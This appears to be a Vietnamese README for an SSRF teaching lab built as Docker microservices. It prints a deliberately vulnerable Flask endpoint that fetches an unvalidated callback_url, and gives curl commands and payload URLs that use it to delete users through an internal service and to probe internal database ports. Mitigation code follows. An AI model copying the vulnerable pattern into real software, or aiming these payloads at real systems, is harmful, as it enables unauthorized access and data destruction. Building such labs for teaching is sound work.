# SSRF Exploit Demo

## Lỗ hổng SSRF trong Inventory Service

### Mô tả
Inventory Service có lỗ hổng SSRF tại endpoint kiểm tra tồn kho. Service chấp nhận parameter `callback_url` và thực hiện HTTP request đến URL đó mà không validate.

### Endpoint dễ bị tấn công

```
GET /api/inventory/{product_id}/{size}?callback_url={url}
```

### Code dễ bị tấn công (inventory-service/app.py)

```python
@app.route('/api/inventory/<int:product_id>/<size>', methods=['GET'])
def get_inventory(product_id, size):
    # VULNERABLE: Accepts callback_url without validation
    callback_url = request.args.get('callback_url')
    
    if callback_url:
        try:
            # VULNERABLE: Making request to user-provided URL
            response = requests.get(callback_url, timeout=5)
            # This allows SSRF attacks!
        except Exception as e:
            print(f"Error: {str(e)}")
    
    # Return inventory data...
```

### Cách khai thác

#### Bước 1: Xem danh sách users (cần admin)

```bash
curl http://localhost:8081/api/users
```

Lấy ID của user muốn xóa, ví dụ: ID = 2

#### Bước 2: Khai thác SSRF để xóa user

Từ giao diện web:
1. Vào trang chi tiết sản phẩm bất kỳ
2. Chọn một size
3. Trong phần "SSRF Vulnerability Demo", nhập:

```
http://user-service:8081/api/users/delete/2
```

4. Click "Trigger SSRF Attack"

Hoặc dùng curl trực tiếp:

```bash
curl "http://localhost:8083/api/inventory/1/M?callback_url=http://user-service:8081/api/users/delete/2"
```

#### Bước 3: Kiểm tra user đã bị xóa

```bash
curl http://localhost:8081/api/users
```

User với ID = 2 sẽ không còn trong danh sách!

### Các exploit URLs khác

```bash
# Xóa user có ID = 1
http://user-service:8081/api/users/delete/1

# Xóa user có ID = 3
http://user-service:8081/api/users/delete/3

# Lấy danh sách users (nếu endpoint không có auth)
http://user-service:8081/api/users

# Truy cập các internal services khác
http://product-service:8082/api/products/

# Scan internal network
http://postgres-user:5432
http://postgres-product:5432
```

### Tại sao lỗ hổng này nguy hiểm?

1. **Bypass Authentication**: Endpoint `/api/users/delete/{id}` không yêu cầu authentication, nhưng nó không được expose ra ngoài. Attacker có thể dùng SSRF để gọi nó từ bên trong.

2. **Access Internal Services**: Có thể truy cập các services chỉ có trong Docker network, không expose ra public.

3. **Port Scanning**: Có thể scan các ports internal để tìm thêm services.

4. **Data Exfiltration**: Có thể đọc dữ liệu từ internal APIs.

### Cách phòng chống

1. **Whitelist URLs**: Chỉ cho phép callback đến một số domain/IPs được phê duyệt

```python
ALLOWED_HOSTS = ['api.trusted-domain.com']

def is_safe_url(url):
    parsed = urlparse(url)
    return parsed.hostname in ALLOWED_HOSTS
```

2. **Disable Internal Network Access**: Không cho phép request đến private IPs

```python
import ipaddress

def is_private_ip(hostname):
    try:
        ip = ipaddress.ip_address(hostname)
        return ip.is_private
    except:
        return False
```

3. **Input Validation**: Validate và sanitize tất cả user inputs

4. **Authentication**: Yêu cầu authentication cho tất cả sensitive endpoints

5. **Network Segmentation**: Tách biệt các services quan trọng

### Demo Video Flow

1. **Setup**:
   - Start system: `docker-compose up`
   - Register admin account
   - Create some products
   - Register a few test users

2. **Demonstrate Normal Flow**:
   - Show product listing
   - Click product detail
   - Select size → show inventory (normal behavior)

3. **Demonstrate SSRF**:
   - Go to Admin → Manage Users
   - Show list of users (note IDs)
   - Go to product detail page
   - Enter SSRF payload in callback URL field
   - Click "Trigger SSRF Attack"
   - Go back to Admin → Manage Users
   - Show that user was deleted!

4. **Show Logs**:
   ```bash
   docker-compose logs inventory-service
   ```
   - Show the SSRF request in logs

### Tài liệu tham khảo

- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [HackerOne SSRF Reports](https://hackerone.com/reports?query=SSRF)
